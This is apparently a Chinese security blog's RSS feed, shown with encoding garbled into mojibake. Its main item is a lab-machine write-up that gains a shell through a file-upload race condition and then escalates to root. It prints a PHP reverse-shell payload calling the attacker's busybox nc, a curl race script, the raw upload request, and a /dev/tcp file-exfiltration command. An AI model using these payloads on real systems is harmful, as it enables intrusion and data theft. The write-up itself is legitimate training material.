* ÊâßË°åËß£Á†ÅÊìç‰ΩúÂêéÔºåÊàë‰ª¨ÂæóÂà∞‰ª•‰∏ãÊòéÊñáÂ≠óÁ¨¶‰∏≤Ôºö

```
hmv{base64decoder}
```

### ÁªìÊûúÔºöFlag

Ëß£Á†ÅÂêéÁöÑÂ≠óÁ¨¶‰∏≤Âç≥‰∏∫Êú¨ÊåëÊàòÁöÑ Flag„ÄÇ

```
hmv{base64decoder}
```
sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20001%20Base64%20-bian-ma-jie-xi.html</guid><pubDate>Fri, 27 Jun 2025 09:28:30 +0000</pubDate></item><item><title>7r1umph Èù∂Êú∫Ê∏óÈÄèÊµãËØïÊä•Âëä (Write-up)</title><link>https://7r1UMPHK.github.io/post/7r1umph%20-ba-ji-shen-tou-ce-shi-bao-gao-%20%28Write-up%29.html</link><description>## 1. ÁõÆÊ†á‰ø°ÊÅØ

*   **Èù∂Êú∫ÂêçÁß∞:** 7r1umph (Êú™ÂèëÂ∏ÉÔºåÂÜÖÈÉ®ÊµãËØïÈù∂Êú∫ÔºåÂèØËÉΩÂêéÁª≠ÂèëÂ∏É‰∫é HackMyVm)
*   **ÈöæÂ∫¶**: easy
*   **Èù∂Êú∫IP:** 192.168.205.187 (ÈÄöËøá`arp-scan`ÂèëÁé∞)
*   **ÊîªÂáªÊú∫IP:** 192.168.205.128 (Kali Linux)

## 2. ‰ø°ÊÅØÊî∂ÈõÜ

### 2.1 ‰∏ªÊú∫ÂèëÁé∞

‰ΩøÁî® `arp-scan` Âú®Êú¨Âú∞ÁΩëÁªú‰∏≠ÂèëÁé∞Â≠òÊ¥ª‰∏ªÊú∫„ÄÇ

```bash
sudo arp-scan -l
```

ËæìÂá∫ÊòæÁ§∫ÁõÆÊ†áIP `192.168.205.187` ÂØπÂ∫îMACÂú∞ÂùÄ `08:00:27:73:20:ed` (Oracle VirtualBox)„ÄÇ

### 2.2 Á´ØÂè£Êâ´Êèè

‰ΩøÁî® `nmap` ÂØπÁõÆÊ†áIPËøõË°åÂÖ®Á´ØÂè£Êâ´ÊèèÔºåËØÜÂà´ÂºÄÊîæÁöÑÊúçÂä°„ÄÇ

```bash
nmap -p- 192.168.205.187
```

Êâ´ÊèèÁªìÊûúÊòæÁ§∫ÂºÄÊîæ‰∫Ü‰ª•‰∏ãÁ´ØÂè£Ôºö

*   **22/tcp:** SSH
*   **80/tcp:** HTTP

### 2.3 WebÁõÆÂΩïÊâ´Êèè

‰ΩøÁî® `gobuster` ÂØπWebÊúçÂä°ËøõË°åÁõÆÂΩïÂíåÊñá‰ª∂Êâ´Êèè„ÄÇ

```bash
gobuster dir -u http://192.168.205.187/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,txt,md,html
```

Êâ´ÊèèÂèëÁé∞‰∫Ü‰ª•‰∏ãÈáçË¶ÅË∑ØÂæÑÔºö

*   `/index.html` (Status: 200)
*   `/info.php` (Status: 200) - PHP‰ø°ÊÅØÊ≥ÑÈú≤È°µÈù¢
*   `/index.php` (Status: 200) - ÂèëÁé∞ÊòØ‰∏Ä‰∏™Êñá‰ª∂‰∏ä‰º†È°µÈù¢
*   `/upload/` (Status: 301 -&gt; Directory) - Êé®Êµã‰∏∫‰∏ä‰º†Êñá‰ª∂ÁöÑÂ≠òÂÇ®ÁõÆÂΩï
*   `/tmp/` (Status: 301 -&gt; Directory) - ÂäüËÉΩÊú™Áü•ÁöÑÁõÆÂΩïÔºå‰πüÂÉèÊñá‰ª∂‰ªìÂ∫ì

### 2.4 WebÊúçÂä°Êé¢Á¥¢

*   ËÆøÈóÆ `http://192.168.205.187/` ÊòæÁ§∫ 'index'ÔºåÂØπÂ∫î `/index.html` ÁöÑÂÜÖÂÆπ„ÄÇ
*   ËÆøÈóÆ `http://192.168.205.187/index.php` Á°ÆËÆ§ÊòØ‰∏Ä‰∏™Êñá‰ª∂‰∏ä‰º†Ë°®Âçï„ÄÇ
*   Â∞ùËØï‰∏ä‰º†‰∏Ä‰∏™PHP Webshell (`shell.php`)„ÄÇ

![Êñá‰ª∂‰∏ä‰º†È°µÈù¢Êà™Âõæ](https://7r1umphk.github.io/image/20250412184148968.png)

‰∏ä‰º†ÂêéÂèëÁé∞Êñá‰ª∂Âá∫Áé∞Âú® `/upload/` ÁõÆÂΩï‰∏ãÔºå‰ΩÜÊñá‰ª∂ÂêçË¢´‰øÆÊîπ‰∏∫ `shell.php.dsz`ÔºåÊó†Ê≥ïÁõ¥Êé•ÊâßË°å„ÄÇÂêåÊó∂ËßÇÂØüÂà∞ `/tmp/` ÁõÆÂΩïÊ≤°ÊúâÊñá‰ª∂Â∏∏È©ª„ÄÇ

ÈÄöËøáÊäìÂåÖÂàÜÊûê‰∏ä‰º†ËøáÁ®ãÔºåÁ°ÆËÆ§‰∫ÜPOSTËØ∑Ê±ÇÁöÑÁªìÊûÑÔºå‰ΩÜÊ≤°ÊúâÂèëÁé∞ÊòéÊòæÁöÑÁªïËøáÁ∫øÁ¥¢„ÄÇ

Ëøõ‰∏ÄÊ≠•ÊµãËØïÂèëÁé∞Ôºå‰∏ä‰º†ÁöÑÊñá‰ª∂‰ºö‰ª•**ÂéüÂßãÊñá‰ª∂Âêç**Áü≠ÊöÇÂú∞Âá∫Áé∞Âú® `/tmp/` ÁõÆÂΩï‰∏ãÔºàÂ§ßÁ∫¶1ÁßíÔºâÔºåÁÑ∂ÂêéÊâçË¢´ÁßªÂä®Âà∞ `/upload/` Âπ∂ÈáçÂëΩÂêç„ÄÇËøôÂ≠òÂú®‰∏Ä‰∏™**Êù°‰ª∂Á´û‰∫â (Race Condition)** ÊºèÊ¥û„ÄÇ

## 3. ÊºèÊ¥ûÂà©Áî® (Êù°‰ª∂Á´û‰∫âËé∑ÂèñÂàùÂßãËÆøÈóÆ)

### 3.1 Âà∂ÂÆöÁ≠ñÁï•

Âà©Áî®Êñá‰ª∂Âú® `/tmp/` ÁõÆÂΩïÁü≠ÊöÇÂ≠òÂú®ÁöÑÁâπÊÄßÔºå‰∏ä‰º†‰∏Ä‰∏™ËÉΩÂèçÂºπShellÁöÑPHPÊñá‰ª∂ÔºåÂπ∂Âú®ÂÆÉË¢´Â§ÑÁêÜÂâçÈÄöËøáHTTPËØ∑Ê±ÇËÆøÈóÆÂÆÉÔºåËß¶ÂèëÂèçÂºπShell„ÄÇ

### 3.2 ÂáÜÂ§áÂ∑•ÂÖ∑

1. **ÂèçÂºπShell Payload (`shell.php`):**
   ‰ΩøÁî®‰∏Ä‰∏™ÁÆÄÂçïÁöÑ `exec` Ë∞ÉÁî® `busybox nc` Êù•ÂèçÂºπshellÔºàÁªèËøáÊµãËØïÂèëÁé∞Ëøô‰∏™ÊØîËæÉÂèØÈù†Ôºâ„ÄÇ

   ```php
   &lt;?php
   exec('busybox nc 192.168.205.128 8888 -e bash');
   ?&gt;
   ```

2. **Êù°‰ª∂Á´û‰∫âËÆøÈóÆËÑöÊú¨ (`a.sh`):**
   ÁºñÂÜô‰∏Ä‰∏™BashËÑöÊú¨ÔºåÊåÅÁª≠ËØ∑Ê±ÇÁõÆÊ†á‰∏¥Êó∂Êñá‰ª∂ÔºåÁõ¥Âà∞ÊàêÂäüÔºàHTTPÁä∂ÊÄÅÁ†Å 200Ôºâ„ÄÇ

   ```bash
   #!/bin/bash
   url='http://192.168.205.187/tmp/shell.php'
   max_attempts=1000 # ÂèØ‰ª•Ê†πÊçÆÈúÄË¶ÅË∞ÉÊï¥Â∞ùËØïÊ¨°Êï∞
   success=false
   
   echo 'ÂºÄÂßãÂ∞ùËØïËÆøÈóÆ $url ...'
   
   # Âπ∂Ë°åÊâßË°å‰∏ä‰º†ÂíåËÆøÈóÆÂ∞ùËØï‰ª•Â¢ûÂä†ÊàêÂäüÁéá
   # Âú®Âè¶‰∏Ä‰∏™ÁªàÁ´ØÊâßË°å‰∏ä‰º†Êìç‰Ωú
   
   for ((i=1; i&lt;=max_attempts; i++)); do
       # ÂèëÈÄÅËØ∑Ê±ÇÂπ∂ÊçïËé∑Áä∂ÊÄÅÁ†Å
       status_code=$(curl -s -o /dev/null -w '%{http_code}' '$url')
   
       echo 'Â∞ùËØï $i: Áä∂ÊÄÅÁ†Å = $status_code'
   
       # Ê£ÄÊµãÂà∞200Êó∂Ê†áËÆ∞ÊàêÂäüÂπ∂ÈÄÄÂá∫Âæ™ÁéØ
       if [[ '$status_code' -eq 200 ]]; then
           echo 'ÊàêÂäüËÆøÈóÆ! $url ËøîÂõû 200 OK.'
           success=true
           break
       fi
   
       # Áü≠ÊöÇÊöÇÂÅúÈÅøÂÖçËøá‰∫éÈ¢ëÁπÅÁöÑËØ∑Ê±Ç (ÂèØÈÄâ)
       sleep 0.05 # Áº©Áü≠Èó¥ÈöîÂ¢ûÂä†ÂëΩ‰∏≠Êú∫‰ºö
   done
   
   if [[ '$success' == true ]]; then
       echo 'Â∑≤Ëß¶ÂèëPayloadÔºåËØ∑Ê£ÄÊü•ÁõëÂê¨Âô®„ÄÇ'
   else
       echo 'Âú® $max_attempts Ê¨°Â∞ùËØïÂêéÊú™ËÉΩÊàêÂäüËÆøÈóÆ„ÄÇ'
   fi
   ```

   *(Ê≥®ÔºöÂéüËÑöÊú¨Âú®Ê£ÄÊµãÂà∞200Âêé‰ºöÊöÇÂÅúÔºåËøôÈáå‰øÆÊîπ‰∏∫Áõ¥Êé•ÊèêÁ§∫ÊàêÂäü)*

3. **Netcat ÁõëÂê¨Âô®:**
   Âú®KaliÊîªÂáªÊú∫‰∏äÂºÄÂêØ `nc` ÁõëÂê¨ÊåáÂÆöÁ´ØÂè£Ôºà8888Ôºâ„ÄÇ

   ```bash
   nc -lvnp 8888
   ```

4. **Burp Suite (Êàñ `curl`):**
   Áî®‰∫éÂèëÈÄÅÂåÖÂê´ÂèçÂºπShell PayloadÁöÑÊñá‰ª∂‰∏ä‰º†POSTËØ∑Ê±Ç„ÄÇ

### 3.3 ÊâßË°åÊîªÂáª

1. Âú®‰∏Ä‰∏™ÁªàÁ´ØËøêË°å `nc -lvnp 8888`„ÄÇ

2. Âú®Âè¶‰∏Ä‰∏™ÁªàÁ´ØËøêË°å `bash a.sh` ÂºÄÂßãÂæ™ÁéØËÆøÈóÆ„ÄÇ

3. ‰ΩøÁî®Burp Suite Repeater (Êàñ `curl`) ÂèëÈÄÅÊûÑÈÄ†Â•ΩÁöÑÊñá‰ª∂‰∏ä‰º†POSTËØ∑Ê±ÇÂà∞ `http://192.168.205.187/index.php`ÔºåÂÜÖÂÆπÂåÖÂê´‰∏äÈù¢ÁöÑ `shell.php` Payload„ÄÇ

   ```http
   POST /index.php HTTP/1.1
   Host: 192.168.205.187
   User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
   Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
   Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
   Accept-Encoding: gzip, deflate, br
   Referer: http://192.168.205.187/index.php
   Content-Type: multipart/form-data; boundary=---------------------------185067380923233129002267529642
   Content-Length: 287  # Ê≥®ÊÑèÊ†πÊçÆÂÆûÈôÖpayloadË∞ÉÊï¥
   Origin: http://192.168.205.187
   Connection: keep-alive
   Upgrade-Insecure-Requests: 1
   Priority: u=0, i
   
   -----------------------------185067380923233129002267529642
   Content-Disposition: form-data; name='file'; filename='shell.php'
   Content-Type: application/x-php
   
   &lt;?php
   exec('busybox nc 192.168.205.128 8888 -e bash');
   ?&gt;
   
   -----------------------------185067380923233129002267529642--
   ```

4. ËßÇÂØü `a.sh` ÁöÑËæìÂá∫„ÄÇÂΩìÁúãÂà∞ `Áä∂ÊÄÅÁ†Å = 200` Êó∂ÔºåÊ£ÄÊü• `nc` ÁõëÂê¨Âô®Á™óÂè£ÔºåÂ∫îËØ•Â∑≤ÁªèÊî∂Âà∞‰∫ÜÂèçÂºπShell„ÄÇ

   ```bash
   ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
   ‚îî‚îÄ$ nc -lvnp 8888
   listening on [any] 8888 ...
   connect to [192.168.205.128] from (UNKNOWN) [192.168.205.187] 58348
   id
   uid=33(www-data) gid=33(www-data) groups=33(www-data)
   pwd
   /var/www/html/tmp
   ```

### 3.4 Shell Á®≥ÂÆöÂåñ

Ëé∑ÂèñÂà∞ÁöÑShellÈÄöÂ∏∏ÊòØÈùû‰∫§‰∫íÂºèÁöÑÔºåÈúÄË¶ÅËøõË°åÁ®≥ÂÆöÂåñÂ§ÑÁêÜ‰ª•‰æøÊõ¥Â•ΩÂú∞Êìç‰Ωú„ÄÇ

```bash
script /dev/null -c bash
# Êåâ Ctrl+Z ÊåÇËµ∑
stty raw -echo; fg
# Êåâ Enter
reset xterm
export TERM=xterm
export SHELL=/bin/bash
# Ê†πÊçÆÈúÄË¶ÅË∞ÉÊï¥Ë°åÂàóÊï∞
stty rows 59 cols 236
```

Áé∞Âú®Êàë‰ª¨Êúâ‰∫Ü‰∏Ä‰∏™Á®≥ÂÆöÁöÑ `www-data` Áî®Êà∑ÁöÑShell„ÄÇ

## 4. ÊùÉÈôêÊèêÂçá

### 4.1 Êú¨Âú∞Êûö‰∏æ (www-data)

ËøõË°åÂü∫Êú¨ÁöÑÁ≥ªÁªüÊûö‰∏æ„ÄÇ

```bash
www-data@7r1umph:/var/www/html/tmp$ ls -la /home
total 12
drwxr-xr-x  3 root    root    4096 Apr 11 22:27 .
drwxr-xr-x 18 root    root    4096 Mar 18 20:37 ..
drwx------  3 welcome welcome 4096 Apr 12 01:29 welcome # ÂèëÁé∞Áî®Êà∑ welcome

www-data@7r1umph:/home$ sudo -l
sudo: unable to resolve host 7r1umph: Name or service not known
[sudo] password for www-data: # ÈúÄË¶ÅÂØÜÁ†ÅÔºåÊó†Ê≥ï‰ΩøÁî®sudo

www-data@7r1umph:/home$ cd /opt/
www-data@7r1umph:/opt$ ls -la
total 56
drwxr-xr-x  2 root root  4096 Apr 12 01:23 .
drwxr-xr-x 18 root root  4096 Mar 18 20:37 ..
-rw-r--r--  1 root root 16968 Apr 12 00:21 guess       # ÂèØÁñëÊñá‰ª∂
-rw-r--r--  1 root root 27871 Apr 12 00:18 yeyeye.png  # ÂèØÁñëÂõæÁâáÊñá‰ª∂
```

### 4.2 ÊèêÊùÉËá≥ welcome Áî®Êà∑

ÂèëÁé∞ `/opt` ÁõÆÂΩï‰∏ãÊúâ‰∏Ä‰∏™ÂõæÁâáÊñá‰ª∂ `yeyeye.png`„ÄÇÂ∞ÜÂÖ∂‰º†ÂõûKaliËøõË°åÂàÜÊûê„ÄÇ

**Âú®Kali‰∏äÂáÜÂ§áÊé•Êî∂:**

```bash
nc -lvnp 4444 &gt; yeyeye.png
```

**Âú®Èù∂Êú∫‰∏äÂèëÈÄÅ:**

```bash
www-data@7r1umph:/opt$ cat yeyeye.png &gt; /dev/tcp/192.168.205.128/4444
```

Âú®Kali‰∏äÊü•ÁúãÂõæÁâá `yeyeye.png`:

![Dorabella Cipher ÂõæÁâá](https://7r1umphk.github.io/image/20250412190141508.png)

ÈÄöËøáÂõæÁâáÂÜÖÂÆπÂíåÁΩëÁªúÊêúÁ¥¢ (GoogleËØÜÂõæÁ≠â)ÔºåÂèØ‰ª•ËØÜÂà´Âá∫ËøôÊòØ‰∏ÄÁßçÂêç‰∏∫ **Dorabella Cipher** ÁöÑÂØÜÁ†Å„ÄÇ

ÂèÇËÄÉÂú®Á∫øËµÑÊñôÔºà Â¶ÇÊèê‰æõÁöÑÈìæÊé• https://geocachen.nl/geocaching/geocache-puzzels-oplossen/dorabella-cipher/ ÔºâËøõË°åÁ†¥ËØëÔºåÂæóÂà∞ÂØÜÁ†ÅÔºö`yecongdong`„ÄÇ

‰ΩøÁî®Ëøô‰∏™ÂØÜÁ†ÅÂ∞ùËØïÂàáÊç¢Âà∞ `welcome` Áî®Êà∑„ÄÇ

```bash
www-data@7r1umph:/opt$ su welcome
Password: yecongdong
$ id
uid=1000(welcome) gid=1000(welcome) groups=1000(welcome)
$ # ÊàêÂäüÂàáÊç¢Âà∞ welcome Áî®Êà∑
```

(ÂèØÈÄâ) ‰∏∫‰∫ÜËé∑ÂæóÊõ¥Â•ΩÁöÑ‰∫§‰∫í‰ΩìÈ™åÔºåÂèØ‰ª•‰ΩøÁî® `welcome:yecongdong` ÈÄöËøáSSHÁôªÂΩïÈù∂Êú∫„ÄÇ

### 4.3 Ëé∑Âèñ User Flag

Âú® `welcome` Áî®Êà∑ÂÆ∂ÁõÆÂΩï‰∏ãÊü•Êâæ `user.txt`„ÄÇ

```bash
welcome@7r1umph:~$ pwd
/home/welcome
welcome@7r1umph:~$ ls -la
total 32
drwx------ 3 welcome welcome 4096 Apr 12 01:29 .
drwxr-xr-x 3 root    root    4096 Apr 11 22:27 ..
# ... ÂÖ∂‰ªñÊñá‰ª∂ ...
-rw-r--r-- 1 root    root      44 Apr 12 00:17 user.txt # ÊâæÂà∞ user flag Êñá‰ª∂
# ... ÂÖ∂‰ªñÊñá‰ª∂ ...
welcome@7r1umph:~$ cat user.txt
flag{user-d650b42437edc28dfd3637c4ccd445ec}
```

ÊàêÂäüËé∑Âèñ `user.flag`„ÄÇ

### 4.4 Êú¨Âú∞Êûö‰∏æ (welcome)

ÁªßÁª≠Âú® `welcome` Áî®Êà∑‰∏ãËøõË°åÊûö‰∏æÔºåÂØªÊâæÊèêÊùÉËá≥ `root` ÁöÑÁ∫øÁ¥¢„ÄÇÂèëÁé∞Âú®ÂÆ∂ÁõÆÂΩï‰∏ãÊúâ‰∏Ä‰∏™ `RegView` ÁõÆÂΩï„ÄÇ

```bash
welcome@7r1umph:~$ cd RegView/
welcome@7r1umph:~/RegView$ ls -al
total 476
drwxr-xr-x 3 root    root      4096 Apr 12 01:32 .
drwx------ 3 welcome welcome   4096 Apr 12 01:29 ..
drwxr-xr-x 8 root    root      4096 Apr 12 01:33 .git   # ÂèëÁé∞ .git ÁõÆÂΩï
# ... ÂÖ∂‰ªñÊñá‰ª∂ ...
-rwxr-xr-x 1 root    root      3911 Apr 12 01:02 RegView.sh
# ... ÂÖ∂‰ªñÊñá‰ª∂ ...
```

ÂèëÁé∞ `.git` ÁõÆÂΩïÔºåË°®ÊòéËøôÊòØ‰∏Ä‰∏™Git‰ªìÂ∫ìÔºåÂèØËÉΩÂåÖÂê´ÂéÜÂè≤‰ø°ÊÅØ„ÄÇ

### 4.5 ÊèêÊùÉËá≥ root Áî®Êà∑

Ê£ÄÊü•Git‰ªìÂ∫ìÁöÑÂéÜÂè≤ËÆ∞ÂΩï„ÄÇ

```bash
welcome@7r1umph:~/RegView$ git log -p
```

Âú® `git log` ÁöÑËæìÂá∫‰∏≠ÔºåÂèëÁé∞‰∫Ü‰∏Ä‰∏™ÂéÜÂè≤Êèê‰∫§ËÆ∞ÂΩïÔºåÂÖ∂‰∏≠Âà†Èô§‰∫Ü‰∏Ä‰∏™Âêç‰∏∫ `source2.txt` ÁöÑÊñá‰ª∂ÔºåËØ•Êñá‰ª∂ÂÜÖÂÆπÂåÖÂê´‰∫Ü‰∏Ä‰∏™ÁúãËµ∑Êù•ÂÉèÂá≠ËØÅÁöÑÂ≠óÁ¨¶‰∏≤Ôºö

```diff
commit acd806aad21acb61112252234c7707bc8a74dd3c (HEAD -&gt; main)
Author: bamuwe &lt;bamuwe@qq.com&gt;
Date:   Sat Apr 12 01:33:50 2025 -0400

    fix bug

diff --git a/source2.txt b/source2.txt
deleted file mode 100644
index fca9fc6..0000000
--- a/source2.txt
+++ /dev/null
@@ -1 +0,0 @@
-root:ff855ad811c79e5fba458a575fac5b83

# ... ÂÖ∂‰ªñÊèê‰∫§ËÆ∞ÂΩï ...
```

ÂèëÁé∞‰∫Ü `root` Áî®Êà∑ÁöÑÂá≠ËØÅ‰ø°ÊÅØÔºö`root:ff855ad811c79e5fba458a575fac5b83`„ÄÇ
ËøôÈáåÁöÑ `ff855ad811c79e5fba458a575fac5b83` ÁúãËµ∑Êù•ÂÉè‰∏Ä‰∏™ÂìàÂ∏åÂÄº„ÄÇ

ÂêåÊó∂ÔºåËÅîÊÉ≥Âà∞‰πãÂâçÂú® `/opt` ÁõÆÂΩï‰∏ãÂèëÁé∞ÁöÑ `guess` Êñá‰ª∂„ÄÇÂèØ‰ª•Â∞ùËØïËÆ°ÁÆóËØ•Êñá‰ª∂ÁöÑMD5ÂÄºÔºö

```bash
welcome@7r1umph:~/RegView$ md5sum /opt/guess
ff855ad811c79e5fba458a575fac5b83  /opt/guess
```

ÂèëÁé∞ `guess` Êñá‰ª∂ÁöÑMD5ÂÄº‰∏éGitÂéÜÂè≤ËÆ∞ÂΩï‰∏≠Ê≥ÑÈú≤ÁöÑ `root` ÂØÜÁ†ÅÔºàÊàñÂìàÂ∏åÔºâÂÆåÂÖ®‰∏ÄËá¥„ÄÇÂú®CTF‰∏≠ÔºåÊúâÊó∂ÂìàÂ∏åÂÄºÊú¨Ë∫´Â∞±ÊòØÂØÜÁ†Å„ÄÇÂ∞ùËØï‰ΩøÁî®Ëøô‰∏™ÂìàÂ∏åÂÄº‰Ωú‰∏∫ `root` ÂØÜÁ†Å„ÄÇ

```bash
welcome@7r1umph:~/RegView$ su -
Password: ff855ad811c79e5fba458a575fac5b83
root@7r1umph:~# id
uid=0(root) gid=0(root) groups=0(root)
# ÊàêÂäüÂàáÊç¢Âà∞ root Áî®Êà∑
```

### 4.6 Ëé∑Âèñ Root Flag

ÂàáÊç¢Âà∞ `root` Áî®Êà∑ÂêéÔºåÂú®ÂÖ∂ÂÆ∂ÁõÆÂΩï‰∏ãÊü•Êâæ `root.txt`„ÄÇ

```bash
root@7r1umph:~# cat /root/root.txt
flag{root-ff855ad811c79e5fba458a575fac5b83}
```

ÊàêÂäüËé∑Âèñ `root.flag`„ÄÇ

## 5. ÊÄªÁªì

Êú¨Ê¨°Ê∏óÈÄèÊµãËØïÈÄöËøá‰ª•‰∏ãÊ≠•È™§ÂÆåÊàêÔºö

1.  **‰ø°ÊÅØÊî∂ÈõÜ:** ‰ΩøÁî® `arp-scan` Âíå `nmap` ÂèëÁé∞ÁõÆÊ†áÂèäÂºÄÊîæÁ´ØÂè£ (SSH, HTTP)„ÄÇ`gobuster` ÂèëÁé∞WebÁõÆÂΩïÁªìÊûÑÔºåÂåÖÊã¨Êñá‰ª∂‰∏ä‰º†ÁÇπ `/index.php` Âíå‰∏§‰∏™ÁõÆÂΩï `/upload/`„ÄÅ`/tmp/`„ÄÇ
2.  **ÂàùÂßãËÆøÈóÆ:** Âà©Áî®Êñá‰ª∂‰∏ä‰º†ÂäüËÉΩ‰∏≠Â≠òÂú®ÁöÑÊù°‰ª∂Á´û‰∫âÊºèÊ¥ûÔºå‰∏ä‰º†ÂèçÂºπShellÁöÑPHPÊñá‰ª∂ÔºåÂπ∂Âú®ÂÖ∂Ë¢´ÁßªÂä®/ÈáçÂëΩÂêç‰πãÂâçÈÄöËøáËÆøÈóÆ `/tmp/` ÁõÆÂΩï‰∏ãÁöÑ‰∏¥Êó∂Êñá‰ª∂Ëß¶ÂèëÔºåËé∑Âæó `www-data` Áî®Êà∑ÁöÑShell„ÄÇ
3.  **ÊùÉÈôêÊèêÂçá (www-data -&gt; welcome):** Âú® `/opt` ÁõÆÂΩïÂèëÁé∞ÂõæÁâáÊñá‰ª∂ `yeyeye.png`ÔºåÂàÜÊûêËØÜÂà´‰∏∫ Dorabella CipherÔºåÁ†¥ËØëÂæóÂà∞ `welcome` Áî®Êà∑ÁöÑÂØÜÁ†Å `yecongdong`ÔºåÊàêÂäüÂàáÊç¢Áî®Êà∑„ÄÇ
4.  **ÊùÉÈôêÊèêÂçá (welcome -&gt; root):** Âú® `welcome` Áî®Êà∑ÂÆ∂ÁõÆÂΩï‰∏ãÁöÑ `RegView` ÁõÆÂΩï‰∏≠ÂèëÁé∞ `.git` ‰ªìÂ∫ì„ÄÇÈÄöËøá `git log -p` Êü•ÁúãÂéÜÂè≤ËÆ∞ÂΩïÔºåÂèëÁé∞‰∏Ä‰∏™Ë¢´Âà†Èô§ÁöÑÊñá‰ª∂ÊõæÂåÖÂê´ `root` ÁöÑÂØÜÁ†ÅÂìàÂ∏å `ff855ad811c79e5fba458a575fac5b83`„ÄÇÂêåÊó∂Á°ÆËÆ§ËØ•ÂìàÂ∏å‰∏é `/opt/guess` Êñá‰ª∂ÁöÑMD5ÂÄºÁõ∏Âêå„ÄÇ‰ΩøÁî®ËØ•ÂìàÂ∏å‰Ωú‰∏∫ÂØÜÁ†ÅÔºåÊàêÂäüÂàáÊç¢Âà∞ `root` Áî®Êà∑„ÄÇ
5.  **Ëé∑ÂèñFlag:** ÂàÜÂà´Âú® `welcome` Âíå `root` Áî®Êà∑ÂÆ∂ÁõÆÂΩï‰∏ãÊâæÂà∞ `user.txt` Âíå `root.txt`ÔºåËé∑ÂèñÊúÄÁªàÁöÑFlag„ÄÇsentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/7r1umph%20-ba-ji-shen-tou-ce-shi-bao-gao-%20%28Write-up%29.html</guid><pubDate>Fri, 27 Jun 2025 09:28:25 +0000</pubDate></item><item><title>üåü Á´ôÁÇπÁæéÂåñÂçáÁ∫ßÂÆåÊàêÈÄöÂëä</title><link>https://7r1UMPHK.github.io/post/%F0%9F%8C%9F%20-zhan-dian-mei-hua-sheng-ji-wan-cheng-tong-gao.html</link><description>![](https://7r1umphk.github.io/image/20250321105722076.png)sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/%F0%9F%8C%9F%20-zhan-dian-mei-hua-sheng-ji-wan-cheng-tong-gao.html</guid><pubDate>Fri, 27 Jun 2025 09:28:21 +0000</pubDate></item><item><title>Áæ§‰∏ªÈ¢òÂêéÁª≠ `-ne` ÁªïËøá - ÂèòÈáèËß£Êûê‰∏é Python 2 `input()` ÁöÑÂêØÁ§∫</title><link>https://7r1UMPHK.github.io/post/qun-zhu-ti-hou-xu-%20%60-ne%60%20-rao-guo-%20-%20-bian-liang-jie-xi-yu-%20Python%202%20%60input%28%29%60%20-de-qi-shi.html</link><description>## ÂâçË®Ä

Âú®‰πãÂâçÁöÑ [WP](https://7r1umph.github.io/post/qun-zhu-ti.html) ‰∏≠ÔºåÊàë‰ª¨ËÆ®ËÆ∫‰∫ÜÂ¶Ç‰ΩïÈÄöËøáËæìÂÖ•ÈùûÊï¥Êï∞Â≠óÁ¨¶‰∏≤ÔºàÂ¶Ç `aaa`ÔºâÊù•ÁªïËøá Bash ËÑöÊú¨‰∏≠ `[[ '$INPUTS' -ne '$a' ]]` ÁöÑÈöèÊú∫Êï∞Ê£ÄÊü•„ÄÇÂÖ∂ÂéüÁêÜÊòØ `-ne` ÁÆóÊúØÊØîËæÉÂú®ÈÅáÂà∞ÈùûÊï¥Êï∞Êó∂Êìç‰ΩúÂ§±Ë¥•ÔºåÂØºËá¥ `[[` ÂëΩ‰ª§ËøîÂõûÈùûÈõ∂ÈÄÄÂá∫Áä∂ÊÄÅÔºåËøõËÄå‰Ωø `if` Êù°‰ª∂Âà§Êñ≠‰∏∫ÂÅá„ÄÇÁÑ∂ËÄåÔºå‰∏éÁæ§ÂÜÖÂ§ß‰Ω¨ '‰∫ëÊ∑°_È£éÊ∏Ö' ÁöÑ‰∫§ÊµÅ‰ª•Âèä‰ªñÁªôÂá∫ÁöÑ `[[ a -ne '$a' ]]` Á§∫‰æãÔºåÂºïÂØºÊàë‰ª¨‰ªéÂè¶‰∏Ä‰∏™ËßíÂ∫¶ÊÄùËÄÉËøô‰∏™ÈóÆÈ¢òÔºåÂπ∂ËÅîÊÉ≥Âà∞‰∫Ü Python 2 `input()` ÁöÑË°å‰∏∫„ÄÇ

## ÊåëÊàòËÑöÊú¨ÂõûÈ°æ

```bash
#!/bin/bash
# challenge2.sh

PATH=/usr/bin
a=$((RANDOM%100)) # ÈöèÊú∫Êï∞ÂèòÈáèÂêç‰∏∫ 'a'
echo $a
read -r INPUTS

# ÂÖ≥ÈîÆÊ£ÄÊü•ÁÇπ: Ê≥®ÊÑè $INPUTS ÊòØÂ∏¶ÂºïÂè∑ÁöÑ
if [[ '$INPUTS' -ne '$a' ]]; then
    exit 1
fi

echo 'È™åËØÅÈÄöËøá!'
# ... ÂêéÁª≠ eval Ê≥®ÂÖ• ...
```

## Â§ß‰Ω¨ÁöÑËßÜËßíÔºö`[[ a -ne '$a' ]]` ÁöÑÊ∑±ÊÑè

Â§ß‰Ω¨ÈÄöËøáÂØπÊØî `[[ a -ne '$a' ]]` Âíå `[[ b -ne '$a' ]]`ÔºàÂÅáËÆæ `b` Êú™ÂÆö‰πâÔºâÁöÑË°å‰∏∫ÔºåÊÉ≥Êè≠Á§∫ `[[ ]]` ÂÜÖÈÉ®ÁöÑ‰∏Ä‰∏™ÈáçË¶ÅÁâπÊÄßÔºö**ÂΩì‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤Âú® `[[ ]]` ÂÜÖÈÉ®Ê≤°ÊúâË¢´ÂºïÂè∑ÂåÖÂõ¥Êó∂ÔºåÂ¶ÇÊûúÂÆÉÁúãËµ∑Êù•ÂÉè‰∏Ä‰∏™ÂêàÊ≥ïÁöÑÂèòÈáèÂêçÔºåBash ÂèØËÉΩ‰ºöÂ∞ùËØïÂ∞ÜÂÖ∂‰Ωú‰∏∫ÂèòÈáèËøõË°åÊâ©Â±ï (Variable Expansion)„ÄÇ**

![9a30eabc231f090b377fe74e23943c46](https://7r1umphk.github.io/image/20250409090621789.jpeg)

*   **Á§∫‰æã 1: `[[ a -ne '$a' ]]`**
